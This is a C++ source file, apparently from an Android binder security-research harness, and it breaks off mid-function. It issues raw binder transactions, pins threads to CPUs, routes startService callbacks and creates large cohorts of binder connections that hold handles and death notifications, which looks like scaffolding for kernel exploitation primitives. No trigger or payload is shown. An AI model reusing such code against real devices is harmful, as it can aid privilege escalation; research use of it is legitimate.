#include "primitive_core.h"

#include <android/binder_ibinder.h>
#include <android/binder_parcel.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <linux/android/binder.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/poll.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#include <algorithm>
#include <array>
#include <atomic>
#include <cerrno>
#include <chrono>
#include <cinttypes>
#include <condition_variable>
#include <cstdio>
#include <cstring>
#include <memory>
#include <mutex>
#include <set>
#include <string>
#include <thread>
#include <vector>

namespace prism::primitive {
namespace {

constexpr std::size_t kBinderMappingSize = 1024 * 1024;
constexpr std::uint64_t kTemplateMagic =
        UINT64_C(0x31504d544d535250);
constexpr std::uint32_t kTemplateVersion = 1;
constexpr std::uint32_t kServiceManagerGetService = 1;
constexpr std::uint32_t kActivityManagerStartService = 34;
constexpr std::uint32_t kBrokerCallbackCode = 0x42b0;
constexpr std::uint32_t kBrokerProof = 0x50524252;
constexpr std::uint32_t kControlledHoldCode = 0x4266;
constexpr std::uint32_t kControlledExportCode = 0x4267;
constexpr std::uint32_t kInterfaceQuery =
        ('_' << 24U) | ('N' << 16U) | ('T' << 8U) | 'F';
constexpr char kMarkerDescriptor[] =
        "com.vandam.prism.RawBrokerMarker";

struct ParcelTemplate {
    std::vector<std::uint8_t> data;
    std::vector<binder_size_t> object_offsets;
};

struct BinderReply {
    int ioctl_result = -1;
    int ioctl_error = 0;
    binder_uintptr_t buffer = 0;
    binder_uintptr_t offsets = 0;
    binder_size_t data_size = 0;
    binder_size_t offsets_size = 0;
    std::uint32_t terminal_response = 0;
};

void write_command(void* output, std::uint32_t command, const void* data,
                   std::size_t data_size) {
    std::memcpy(output, &command, sizeof(command));
    if (data != nullptr && data_size > 0) {
        std::memcpy(static_cast<std::uint8_t*>(output) + sizeof(command),
                    data, data_size);
    }
}

int write_binder_commands(int fd, const void* data, std::size_t size) {
    const auto* bytes = static_cast<const std::uint8_t*>(data);
    std::size_t consumed = 0;
    for (int attempt = 0; attempt < 256 && consumed < size; ++attempt) {
        binder_write_read request {};
        request.write_size = size - consumed;
        request.write_buffer = reinterpret_cast<binder_uintptr_t>(
                bytes + consumed);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            if (errno == EINTR) {
                continue;
            }
            return -1;
        }
        if (request.write_consumed == 0 ||
                request.write_consumed > size - consumed) {
            errno = EIO;
            return -1;
        }
        consumed += static_cast<std::size_t>(request.write_consumed);
    }
    return consumed == size ? 0 : -1;
}

bool pin_current_thread(int cpu) {
    if (cpu < 0 || cpu >= CPU_SETSIZE) {
        return false;
    }
    cpu_set_t affinity;
    CPU_ZERO(&affinity);
    CPU_SET(cpu, &affinity);
    for (int attempt = 0; attempt < 8; ++attempt) {
        if (sched_setaffinity(0, sizeof(affinity), &affinity) == 0) {
            for (int confirmation = 0; confirmation < 200;
                 ++confirmation) {
                if (sched_getcpu() == cpu) {
                    return true;
                }
                sched_yield();
                usleep(50);
            }
        }
        usleep(200);
    }
    return false;
}

bool free_buffer(int fd, binder_uintptr_t buffer) {
    if (buffer == 0) {
        return false;
    }
    std::uint8_t command[sizeof(std::uint32_t) + sizeof(buffer)] {};
    write_command(command, BC_FREE_BUFFER, &buffer, sizeof(buffer));
    binder_write_read request {};
    request.write_size = sizeof(command);
    request.write_buffer = reinterpret_cast<binder_uintptr_t>(command);
    return ioctl(fd, BINDER_WRITE_READ, &request) == 0 &&
            request.write_consumed == sizeof(command);
}

bool drain_transaction_complete(int fd) {
    auto deadline = std::chrono::steady_clock::now() +
            std::chrono::milliseconds(50);
    while (std::chrono::steady_clock::now() < deadline) {
        pollfd descriptor {fd, POLLIN, 0};
        auto remaining = std::chrono::duration_cast<
                std::chrono::milliseconds>(deadline -
                        std::chrono::steady_clock::now()).count();
        int poll_result = poll(&descriptor, 1,
                static_cast<int>(std::max<std::int64_t>(1, remaining)));
        if (poll_result < 0 && errno == EINTR) {
            continue;
        }
        if (poll_result <= 0) {
            return false;
        }
        std::uint8_t read_buffer[256] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            if (errno == EINTR) {
                continue;
            }
            return false;
        }
        for (std::size_t cursor = 0;
             cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + cursor,
                    sizeof(response));
            cursor += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (cursor + payload_size > request.read_consumed) {
                return false;
            }
            if (response == BR_TRANSACTION_COMPLETE) {
                return true;
            }
            cursor += payload_size;
        }
    }
    return false;
}

bool drain_clear_death(int fd, binder_uintptr_t expected_cookie) {
    auto deadline = std::chrono::steady_clock::now() +
            std::chrono::milliseconds(100);
    while (std::chrono::steady_clock::now() < deadline) {
        pollfd descriptor {fd, POLLIN, 0};
        auto remaining = std::chrono::duration_cast<
                std::chrono::milliseconds>(deadline -
                        std::chrono::steady_clock::now()).count();
        int poll_result = poll(&descriptor, 1,
                static_cast<int>(std::max<std::int64_t>(1, remaining)));
        if (poll_result < 0 && errno == EINTR) {
            continue;
        }
        if (poll_result <= 0) {
            return false;
        }
        std::uint8_t read_buffer[256] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                read_buffer);
        if (ioctl(fd, BINDER_WRITE_READ, &request) != 0) {
            if (errno == EINTR) {
                continue;
            }
            return false;
        }
        for (std::size_t cursor = 0;
             cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + cursor,
                    sizeof(response));
            cursor += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (cursor + payload_size > request.read_consumed) {
                return false;
            }
            if (response == BR_CLEAR_DEATH_NOTIFICATION_DONE &&
                    payload_size >= sizeof(binder_uintptr_t)) {
                binder_uintptr_t cookie = 0;
                std::memcpy(&cookie, read_buffer + cursor,
                        sizeof(cookie));
                return cookie == expected_cookie;
            }
            cursor += payload_size;
        }
    }
    return false;
}

BinderReply transact_and_read(
        int fd, const binder_transaction_data& transaction) {
    BinderReply result;
    std::uint8_t command[
            sizeof(std::uint32_t) + sizeof(transaction)] {};
    write_command(command, BC_TRANSACTION, &transaction,
                  sizeof(transaction));
    std::size_t written = 0;
    for (int attempt = 0; attempt < 256; ++attempt) {
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.write_size = sizeof(command) - written;
        request.write_buffer = reinterpret_cast<binder_uintptr_t>(
                command + written);
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                read_buffer);
        result.ioctl_result = ioctl(fd, BINDER_WRITE_READ, &request);
        result.ioctl_error = errno;
        if (result.ioctl_result != 0) {
            if (errno == EINTR) {
                continue;
            }
            return result;
        }
        if (request.write_consumed > sizeof(command) - written) {
            result.ioctl_result = -1;
            result.ioctl_error = EIO;
            return result;
        }
        written += static_cast<std::size_t>(request.write_consumed);
        for (std::size_t cursor = 0;
             cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + cursor, sizeof(response));
            cursor += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (cursor + payload_size > request.read_consumed) {
                result.ioctl_result = -1;
                result.ioctl_error = EPROTO;
                return result;
            }
            if (response == BR_REPLY &&
                    payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data reply {};
                std::memcpy(&reply, read_buffer + cursor, sizeof(reply));
                result.buffer = reply.data.ptr.buffer;
                result.offsets = reply.data.ptr.offsets;
                result.data_size = reply.data_size;
                result.offsets_size = reply.offsets_size;
                result.terminal_response = response;
                return result;
            }
            if (response == BR_FAILED_REPLY || response == BR_DEAD_REPLY) {
                result.terminal_response = response;
                return result;
            }
            cursor += payload_size;
        }
    }
    result.ioctl_result = -1;
    result.ioctl_error = EAGAIN;
    return result;
}

std::string query_descriptor(int fd, int handle) {
    binder_transaction_data transaction {};
    transaction.target.handle = static_cast<std::uint32_t>(handle);
    transaction.code = kInterfaceQuery;
    BinderReply reply = transact_and_read(fd, transaction);
    if (reply.buffer == 0 || reply.data_size < sizeof(std::int32_t)) {
        return {};
    }
    const auto* data = reinterpret_cast<const std::uint8_t*>(reply.buffer);
    std::int32_t length = 0;
    std::memcpy(&length, data, sizeof(length));
    std::string descriptor;
    if (length > 0 && static_cast<std::size_t>(length) <=
            (reply.data_size - sizeof(length)) / sizeof(char16_t)) {
        descriptor.reserve(length);
        for (std::int32_t index = 0; index < length; ++index) {
            char16_t character = 0;
            std::memcpy(&character,
                    data + sizeof(length) + index * sizeof(character),
                    sizeof(character));
            if (character > 0x7f) {
                descriptor.clear();
                break;
            }
            descriptor.push_back(static_cast<char>(character));
        }
    }
    free_buffer(fd, reply.buffer);
    return descriptor;
}

bool load_template(const char* path, ParcelTemplate* output, int* error) {
    if (path == nullptr || output == nullptr) {
        if (error != nullptr) {
            *error = EINVAL;
        }
        return false;
    }
    int fd = open(path, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    struct stat metadata {};
    bool valid = fd >= 0 && fstat(fd, &metadata) == 0 &&
            S_ISREG(metadata.st_mode) && metadata.st_uid == getuid() &&
            metadata.st_size >= 24 && metadata.st_size <= 64 * 1024;
    std::vector<std::uint8_t> bytes(valid ? metadata.st_size : 0);
    std::size_t consumed = 0;
    while (valid && consumed < bytes.size()) {
        ssize_t amount = read(fd, bytes.data() + consumed,
                              bytes.size() - consumed);
        if (amount < 0 && errno == EINTR) {
            continue;
        }
        valid = amount > 0;
        if (valid) {
            consumed += static_cast<std::size_t>(amount);
        }
    }
    int saved_error = valid ? 0 : errno;
    if (fd >= 0) {
        close(fd);
    }
    std::uint64_t magic = 0;
    std::uint32_t version = 0;
    std::uint32_t data_size = 0;
    std::uint32_t object_count = 0;
    std::uint32_t reserved = 0;
    if (valid) {
        std::memcpy(&magic, bytes.data(), sizeof(magic));
        std::memcpy(&version, bytes.data() + 8, sizeof(version));
        std::memcpy(&data_size, bytes.data() + 12, sizeof(data_size));
        std::memcpy(&object_count, bytes.data() + 16,
                    sizeof(object_count));
        std::memcpy(&reserved, bytes.data() + 20, sizeof(reserved));
        std::size_t header_size = 24 +
                static_cast<std::size_t>(object_count) *
                        sizeof(binder_size_t);
        valid = magic == kTemplateMagic && version == kTemplateVersion &&
                reserved == 0 && object_count <= 64 &&
                header_size <= bytes.size() &&
                data_size == bytes.size() - header_size;
        if (valid) {
            output->object_offsets.resize(object_count);
            if (object_count > 0) {
                std::memcpy(output->object_offsets.data(),
                        bytes.data() + 24,
                        object_count * sizeof(binder_size_t));
            }
            output->data.assign(bytes.begin() + header_size, bytes.end());
            for (binder_size_t offset : output->object_offsets) {
                valid = offset <= output->data.size() &&
                        output->data.size() - offset >=
                                sizeof(flat_binder_object);
                if (!valid) {
                    break;
                }
            }
        }
    }
    if (error != nullptr) {
        *error = valid ? 0 : (saved_error == 0 ? EPROTO : saved_error);
    }
    return valid;
}

std::uint64_t boot_nanoseconds() {
    timespec value {};
    if (clock_gettime(CLOCK_BOOTTIME, &value) != 0) {
        return 0;
    }
    return static_cast<std::uint64_t>(value.tv_sec) * 1000000000ULL +
            static_cast<std::uint64_t>(value.tv_nsec);
}

void emit(EventSink sink, void* context, std::uint64_t started,
          const char* stage, const std::string& detail) {
    if (sink != nullptr) {
        sink(context, boot_nanoseconds() - started, stage, detail.c_str());
    }
}

Result failure(std::uint64_t started, const char* stage, int error,
               EventSink sink, void* context) {
    Result result;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.stage = stage;
    result.detail = std::string("errno=") + std::to_string(error) +
            " message=" + std::strerror(error);
    emit(sink, context, started, stage, result.detail);
    return result;
}

void* broker_create(void* arguments) {
    return arguments;
}

void broker_destroy(void*) {}

binder_status_t broker_transaction(AIBinder*, transaction_code_t,
                                   const AParcel*, AParcel*) {
    return STATUS_UNKNOWN_TRANSACTION;
}

}  // namespace

struct BinderDeathBarrier::State {
    std::mutex mutex;
    std::condition_variable changed;
    bool died = false;
    bool unlinked = false;
};

void BinderDeathBarrier::binder_died(void* cookie) {
    auto& state = *static_cast<std::shared_ptr<State>*>(cookie);
    {
        std::lock_guard<std::mutex> lock(state->mutex);
        state->died = true;
    }
    state->changed.notify_all();
}

void BinderDeathBarrier::binder_unlinked(void* cookie) {
    std::unique_ptr<std::shared_ptr<State>> state(
            static_cast<std::shared_ptr<State>*>(cookie));
    {
        std::lock_guard<std::mutex> lock((*state)->mutex);
        (*state)->unlinked = true;
    }
    (*state)->changed.notify_all();
}

BinderDeathBarrier::BinderDeathBarrier(
        AIBinder* binder, AIBinder_DeathRecipient* recipient,
        std::shared_ptr<State> state, binder_status_t link_status)
    : binder_(binder),
      recipient_(recipient),
      state_(std::move(state)),
      link_status_(link_status) {}

std::unique_ptr<BinderDeathBarrier> BinderDeathBarrier::arm(
        AIBinder* binder, binder_status_t* status) {
    if (binder == nullptr || AIBinder_isRemote(binder) == false) {
        if (status != nullptr) {
            *status = STATUS_INVALID_OPERATION;
        }
        return nullptr;
    }
    auto state = std::make_shared<State>();
    auto* cookie = new (std::nothrow) std::shared_ptr<State>(state);
    if (cookie == nullptr) {
        if (status != nullptr) {
            *status = STATUS_NO_MEMORY;
        }
        return nullptr;
    }
    AIBinder_DeathRecipient* recipient =
            AIBinder_DeathRecipient_new(binder_died);
    if (recipient == nullptr) {
        delete cookie;
        if (status != nullptr) {
            *status = STATUS_NO_MEMORY;
        }
        return nullptr;
    }
    AIBinder_DeathRecipient_setOnUnlinked(recipient, binder_unlinked);
    AIBinder_incStrong(binder);
    binder_status_t link_status = AIBinder_linkToDeath(
            binder, recipient, cookie);
    if (status != nullptr) {
        *status = link_status;
    }
    if (link_status != STATUS_OK) {
        AIBinder_DeathRecipient_delete(recipient);
        AIBinder_decStrong(binder);
        return nullptr;
    }
    return std::unique_ptr<BinderDeathBarrier>(
            new BinderDeathBarrier(
                    binder, recipient, std::move(state), link_status));
}

BinderDeathBarrier::~BinderDeathBarrier() {
    AIBinder_DeathRecipient_delete(recipient_);
    AIBinder_decStrong(binder_);
}

DeathObservation BinderDeathBarrier::wait(
        std::uint64_t timeout_milliseconds) {
    const auto started = std::chrono::steady_clock::now();
    const auto deadline = started +
            std::chrono::milliseconds(timeout_milliseconds);
    std::unique_lock<std::mutex> lock(state_->mutex);
    state_->changed.wait_until(lock, deadline, [&] {
        return state_->died && state_->unlinked;
    });
    DeathObservation observation;
    observation.died = state_->died;
    observation.unlinked = state_->unlinked;
    observation.passed = observation.died && observation.unlinked;
    observation.link_status = link_status_;
    observation.duration_nanoseconds =
            std::chrono::duration_cast<std::chrono::nanoseconds>(
                    std::chrono::steady_clock::now() - started).count();
    return observation;
}

ProcessLifetimeGuard::ProcessLifetimeGuard(int descriptor)
    : descriptor_(descriptor) {}

std::unique_ptr<ProcessLifetimeGuard> ProcessLifetimeGuard::arm(
        int pid, int* error) {
    if (pid <= 0) {
        if (error != nullptr) {
            *error = EINVAL;
        }
        return nullptr;
    }
    errno = 0;
    int descriptor = static_cast<int>(syscall(SYS_pidfd_open, pid, 0));
    if (descriptor < 0) {
        if (error != nullptr) {
            *error = errno;
        }
        return nullptr;
    }
    if (error != nullptr) {
        *error = 0;
    }
    return std::unique_ptr<ProcessLifetimeGuard>(
            new ProcessLifetimeGuard(descriptor));
}

ProcessLifetimeGuard::~ProcessLifetimeGuard() {
    close(descriptor_);
}

bool ProcessLifetimeGuard::alive(int* error) const {
    pollfd descriptor {descriptor_, POLLIN, 0};
    errno = 0;
    int result = poll(&descriptor, 1, 0);
    if (result == 0) {
        if (error != nullptr) {
            *error = 0;
        }
        return true;
    }
    if (error != nullptr) {
        *error = result < 0 ? errno : 0;
    }
    return false;
}

Result probe(const Configuration& configuration, EventSink sink,
             void* sink_context) {
    const std::uint64_t started = boot_nanoseconds();
    emit(sink, sink_context, started, "start", "mode=probe");

    utsname system {};
    if (uname(&system) != 0) {
        return failure(started, "uname", errno, sink, sink_context);
    }
    char identity[512];
    std::snprintf(identity, sizeof(identity),
                  "machine=%s release=%s pid=%d uid=%d",
                  system.machine, system.release, getpid(), getuid());
    emit(sink, sink_context, started, "identity", identity);

    int binder = open(configuration.binder_path, O_RDWR | O_CLOEXEC);
    if (binder < 0) {
        return failure(started, "binder-open", errno, sink, sink_context);
    }
    emit(sink, sink_context, started, "binder-open", "status=pass");

    binder_version version {};
    if (ioctl(binder, BINDER_VERSION, &version) != 0) {
        int saved_errno = errno;
        close(binder);
        return failure(started, "binder-version", saved_errno, sink,
                       sink_context);
    }
    char version_detail[64];
    std::snprintf(version_detail, sizeof(version_detail), "protocol=%d",
                  version.protocol_version);
    emit(sink, sink_context, started, "binder-version", version_detail);

    void* mapping = mmap(nullptr, kBinderMappingSize, PROT_READ,
                         MAP_PRIVATE | MAP_NORESERVE, binder, 0);
    if (mapping == MAP_FAILED) {
        int saved_errno = errno;
        close(binder);
        return failure(started, "binder-map", saved_errno, sink,
                       sink_context);
    }
    emit(sink, sink_context, started, "binder-map", "status=pass bytes=1048576");

    bool unmapped = munmap(mapping, kBinderMappingSize) == 0;
    bool closed = close(binder) == 0;
    if (!unmapped || !closed) {
        return failure(started, "binder-close", errno, sink, sink_context);
    }

    Result result;
    result.passed = true;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.stage = "probe-complete";
    result.detail = "status=pass";
    emit(sink, sink_context, started, result.stage.c_str(),
         result.detail);
    return result;
}

Result probe_broker(EventSink sink, void* sink_context) {
    const std::uint64_t started = boot_nanoseconds();
    emit(sink, sink_context, started, "start", "mode=broker-probe");

    AIBinder_Class* binder_class = AIBinder_Class_define(
            "com.vandam.prism.PrimitiveProbe", broker_create,
            broker_destroy, broker_transaction);
    if (binder_class == nullptr) {
        return failure(started, "broker-class", EIO, sink, sink_context);
    }
    AIBinder* binder = AIBinder_new(binder_class, nullptr);
    if (binder == nullptr) {
        return failure(started, "broker-node", EIO, sink, sink_context);
    }

    std::string name = "prism.primitive.probe." +
            std::to_string(getpid());
    using AddService = binder_status_t (*)(AIBinder*, const char*);
    auto add_service = reinterpret_cast<AddService>(
            dlsym(RTLD_DEFAULT, "AServiceManager_addService"));
    if (add_service == nullptr) {
        AIBinder_decStrong(binder);
        return failure(started, "broker-symbol", ENOSYS, sink,
                       sink_context);
    }
    binder_status_t status = add_service(binder, name.c_str());
    AIBinder_decStrong(binder);

    char detail[256];
    std::snprintf(detail, sizeof(detail), "status=%d name=%s",
                  status, name.c_str());
    emit(sink, sink_context, started, "broker-register", detail);

    Result result;
    result.passed = status == STATUS_OK;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.stage = result.passed ? "broker-probe-complete" :
            "broker-register";
    result.detail = detail;
    return result;
}

Result probe_route(const char* service_template_path,
                   const char* start_template_path, EventSink sink,
                   void* sink_context) {
    const std::uint64_t started = boot_nanoseconds();
    emit(sink, sink_context, started, "start", "mode=route-probe");
    ParcelTemplate service;
    ParcelTemplate start;
    int template_error = 0;
    if (!load_template(service_template_path, &service, &template_error) ||
            !load_template(start_template_path, &start, &template_error) ||
            !service.object_offsets.empty() ||
            start.object_offsets.size() != 1) {
        return failure(started, "route-template",
                       template_error == 0 ? EPROTO : template_error,
                       sink, sink_context);
    }

    std::array<std::uint64_t, 2> callback_identity {};
    callback_identity[0] = reinterpret_cast<std::uintptr_t>(
            &callback_identity[0]);
    callback_identity[1] = reinterpret_cast<std::uintptr_t>(
            &callback_identity[1]);
    flat_binder_object callback {};
    std::memcpy(&callback,
            start.data.data() + start.object_offsets.front(),
            sizeof(callback));
    if (callback.hdr.type != BINDER_TYPE_BINDER) {
        return failure(started, "route-callback-template", EPROTO, sink,
                       sink_context);
    }
    callback.binder = callback_identity[0];
    callback.cookie = callback_identity[1];
    std::memcpy(start.data.data() + start.object_offsets.front(),
                &callback, sizeof(callback));

    int binder = open("/dev/binder", O_RDWR | O_CLOEXEC);
    binder_version version {};
    void* mapping = MAP_FAILED;
    if (binder >= 0 && ioctl(binder, BINDER_VERSION, &version) == 0 &&
            version.protocol_version == 8) {
        mapping = mmap(nullptr, kBinderMappingSize, PROT_READ,
                       MAP_PRIVATE | MAP_NORESERVE, binder, 0);
    }
    if (binder < 0 || mapping == MAP_FAILED) {
        int saved_error = errno;
        if (binder >= 0) {
            close(binder);
        }
        return failure(started, "route-context", saved_error, sink,
                       sink_context);
    }

    binder_transaction_data get_service {};
    get_service.target.handle = 0;
    get_service.code = kServiceManagerGetService;
    get_service.data_size = service.data.size();
    get_service.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
            service.data.data());
    BinderReply service_reply = transact_and_read(binder, get_service);
    int activity_handle = -1;
    if (service_reply.buffer != 0 &&
            service_reply.offsets_size >= sizeof(binder_size_t)) {
        binder_size_t offset = 0;
        std::memcpy(&offset,
                reinterpret_cast<const void*>(service_reply.offsets),
                sizeof(offset));
        if (offset <= service_reply.data_size &&
                service_reply.data_size - offset >=
                        sizeof(flat_binder_object)) {
            flat_binder_object object {};
            std::memcpy(&object,
                    reinterpret_cast<const std::uint8_t*>(
                            service_reply.buffer) + offset,
                    sizeof(object));
            if (object.hdr.type == BINDER_TYPE_HANDLE) {
                activity_handle = static_cast<int>(object.handle);
            }
        }
    }

    BinderReply start_reply;
    bool start_pass = false;
    std::int32_t exception = INT32_MIN;
    if (activity_handle > 0) {
        binder_transaction_data transaction {};
        transaction.target.handle =
                static_cast<std::uint32_t>(activity_handle);
        transaction.code = kActivityManagerStartService;
        transaction.data_size = start.data.size();
        transaction.offsets_size = start.object_offsets.size() *
                sizeof(binder_size_t);
        transaction.data.ptr.buffer = reinterpret_cast<binder_uintptr_t>(
                start.data.data());
        transaction.data.ptr.offsets = reinterpret_cast<binder_uintptr_t>(
                start.object_offsets.data());
        start_reply = transact_and_read(binder, transaction);
        if (start_reply.buffer != 0 &&
                start_reply.data_size >= sizeof(exception)) {
            std::memcpy(&exception,
                    reinterpret_cast<const void*>(start_reply.buffer),
                    sizeof(exception));
        }
        start_pass = start_reply.ioctl_result == 0 &&
                start_reply.buffer != 0 && exception == 0;
    }

    std::uint32_t enter_looper = BC_ENTER_LOOPER;
    bool entered = start_pass && write_binder_commands(
            binder, &enter_looper, sizeof(enter_looper)) == 0;
    int original_flags = fcntl(binder, F_GETFL, 0);
    bool nonblocking = entered && original_flags >= 0 &&
            fcntl(binder, F_SETFL, original_flags | O_NONBLOCK) == 0;
    binder_uintptr_t callback_buffer = 0;
    int marker_handle = -1;
    std::uint32_t callback_prefix = 0;
    bool callback_target = false;
    auto deadline = std::chrono::steady_clock::now() +
            std::chrono::seconds(5);
    while (nonblocking && marker_handle <= 0 &&
            std::chrono::steady_clock::now() < deadline) {
        pollfd descriptor {binder, POLLIN, 0};
        auto remaining = std::chrono::duration_cast<
                std::chrono::milliseconds>(
                deadline - std::chrono::steady_clock::now()).count();
        int poll_result = poll(&descriptor, 1,
                static_cast<int>(std::max<std::int64_t>(1, remaining)));
        if (poll_result < 0 && errno == EINTR) {
            continue;
        }
        if (poll_result <= 0) {
            break;
        }
        std::uint8_t read_buffer[4096] {};
        binder_write_read request {};
        request.read_size = sizeof(read_buffer);
        request.read_buffer = reinterpret_cast<binder_uintptr_t>(
                read_buffer);
        if (ioctl(binder, BINDER_WRITE_READ, &request) != 0) {
            if (errno == EINTR || errno == EAGAIN) {
                continue;
            }
            break;
        }
        for (std::size_t cursor = 0;
             cursor + sizeof(std::uint32_t) <= request.read_consumed;) {
            std::uint32_t response = 0;
            std::memcpy(&response, read_buffer + cursor,
                        sizeof(response));
            cursor += sizeof(response);
            std::size_t payload_size = _IOC_SIZE(response);
            if (cursor + payload_size > request.read_consumed) {
                break;
            }
            if (response == BR_TRANSACTION &&
                    payload_size >= sizeof(binder_transaction_data)) {
                binder_transaction_data transaction {};
                std::memcpy(&transaction, read_buffer + cursor,
                            sizeof(transaction));
                callback_target =
                        transaction.code == kBrokerCallbackCode &&
                        transaction.target.ptr == callback_identity[0] &&
                        transaction.cookie == callback_identity[1];
                if (callback_target &&
                        transaction.data_size >= sizeof(callback_prefix) &&
                        transaction.offsets_size >= sizeof(binder_size_t)) {
                    const auto* data =
                            reinterpret_cast<const std::uint8_t*>(
                                    transaction.data.ptr.buffer);
                    std::memcpy(&callback_prefix, data,
                                sizeof(callback_prefix));
                    binder_size_t offset = 0;
                    std::memcpy(&offset,
                            reinterpret_cast<const void*>(
                                    transaction.data.ptr.offsets),
                            sizeof(offset));
                    if (offset <= transaction.data_size &&
                            transaction.data_size - offset >=
                                    sizeof(flat_binder_object)) {
                        flat_binder_object object {};
                        std::memcpy(&object, data + offset, sizeof(object));
                        if (object.hdr.type == BINDER_TYPE_HANDLE) {
                            marker_handle = static_cast<int>(object.handle);
                            callback_buffer = transaction.data.ptr.buffer;
                        }
                    }
                }
            }
            cursor += payload_size;
        }
    }
    if (original_flags >= 0) {
        fcntl(binder, F_SETFL, original_flags);
    }
    std::string descriptor = marker_handle > 0
            ? query_descriptor(binder, marker_handle) : std::string();
    bool passed = start_pass && entered && nonblocking && callback_target &&
            callback_prefix == kBrokerProof && marker_handle > 0 &&
            descriptor == kMarkerDescriptor;
    if (callback_buffer != 0) {
        passed = free_buffer(binder, callback_buffer) && passed;
    }
    if (start_reply.buffer != 0) {
        passed = free_buffer(binder, start_reply.buffer) && passed;
    }
    if (service_reply.buffer != 0) {
        passed = free_buffer(binder, service_reply.buffer) && passed;
    }
    passed = munmap(mapping, kBinderMappingSize) == 0 && passed;
    passed = close(binder) == 0 && passed;

    char detail[512];
    std::snprintf(detail, sizeof(detail),
            "status=%s activity_handle=%d start_exception=%" PRId32
            " callback_target=%d callback_prefix=%08" PRIx32
            " marker_handle=%d descriptor=%s",
            passed ? "pass" : "fail", activity_handle, exception,
            callback_target ? 1 : 0, callback_prefix, marker_handle,
            descriptor.empty() ? "none" : descriptor.c_str());
    Result result;
    result.passed = passed;
    result.duration_nanoseconds = boot_nanoseconds() - started;
    result.stage = "route-probe-complete";
    result.detail = detail;
    emit(sink, sink_context, started, result.stage.c_str(), result.detail);
    return result;
}

struct HolderCohort::State {
    struct Route {
        int fd = -1;
        void* mapping = MAP_FAILED;
        std::array<std::uint64_t, 2> callback_identity {};
        std::vector<std::uint32_t> handles;
        std::vector<binder_handle_cookie> death_notifications;
    };

    explicit State(int count) : routes(static_cast<std::size_t>(count)) {}

    std::vector<Route> routes;
    int released_handles = 0;
    int cleared_death_notifications = 0;
    bool released = false;
};

HolderCohort::HolderCohort(std::unique_ptr<State> state)
    : state_(std::move(state)) {}

HolderCohort::~HolderCohort() {
    if (state_ != nullptr && !state_->released) {
        release(nullptr);
    }
}

std::unique_ptr<HolderCohort> HolderCohort::create(
        const char* service_template_path,
        const char* start_template_path,
        int holder_count,
        std::int32_t index_sentinel,
        Result* output,
        EventSink sink,
        void* sink_context) {
    const std::uint64_t started = boot_nanoseconds();
    Result result;
    result.stage = "holder-cohort-create";
    ParcelTemplate service;
    ParcelTemplate start_template;
    int template_error = 0;
    bool templates = holder_count > 0 && holder_count <= 512 &&
            index_sentinel > 0 &&
            load_template(service_template_path, &service,
                    &template_error) &&
            load_template(start_template_path, &start_template,
                    &template_error) &&
            service.object_offsets.empty() &&
            start_template.object_offsets.size() == 1;
    std::size_t sentinel_offset = 0;
    int sentinel_matches = 0;
    if (templates) {
        for (std::size_t offset = 0;
             offset + sizeof(index_sentinel) <= start_template.data.size();
             ++offset) {
            std::int32_t candidate = 0;
            std::memcpy(&candidate, start_template.data.data() + offset,
                    sizeof(candidate));
            if (candidate == index_sentinel) {
                sentinel_offset = offset;
                ++sentinel_matches;
            }
        }
        binder_size_t callback_offset =
                start_template.object_offsets.front();
        templates = sentinel_matches == 1 &&
                !(sentinel_offset >= callback_offset &&
                  sentinel_offset < callback_offset +
                          sizeof(flat_binder_object));
    }
    if (!templates) {
        result.duration_nanoseconds = boot_nanoseconds() - started;
        result.detail = "status=fail reason=template errno=" +
                std::to_string(template_error) + " sentinel_matches=" +
                std::to_string(sentinel_matches);
        if (output != nullptr) {
            *output = result;
        }
        emit(sink, sink_context, started, result.stage.c_str(),
                result.detail);
        return nullptr;
    }

    auto state = std::make_unique<State>(holder_count);
    auto open_route = [&](int index, State::Route* route) {
        ParcelTemplate start = start_template;
        std::int32_t holder_index = index;
        std::memcpy(start.data.data() + sentinel_offset, &holder_index,
                sizeof(holder_index));
        flat_binder_object callback {};
        std::memcpy(&callback,
                start.data.data() + start.object_offsets.front(),
                sizeof(callback));
        if (callback.hdr.type != BINDER_TYPE_BINDER) {
            return false;
        }
        route->callback_identity[0] =
                reinterpret_cast<std::uintptr_t>(
                        &route->callback_identity[0]);
        route->callback_identity[1] =
                reinterpret_cast<std::uintptr_t>(
                        &route->callback_identity[1]);
        callback.binder = route->callback_identity[0];
        callback.cookie = route->callback_identity[1];
        std::memcpy(start.data.data() + start.object_offsets.front(),
                &callback, sizeof(callback));

        int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        binder_version version {};
        void* mapping = MAP_FAILED;
        if (fd >= 0 && ioctl(fd, BINDER_VERSION, &version) == 0 &&
                version.protocol_version == 8) {
            mapping = mmap(nullptr, kBinderMappingSize, PROT_READ,
                    MAP_PRIVATE | MAP_NORESERVE, fd, 0);
        }
        if (fd < 0 || mapping == MAP_FAILED) {
            if (fd >= 0) {
                close(fd);
            }
            return false;
        }

        binder_transaction_data get_service {};
        get_service.target.handle = 0;
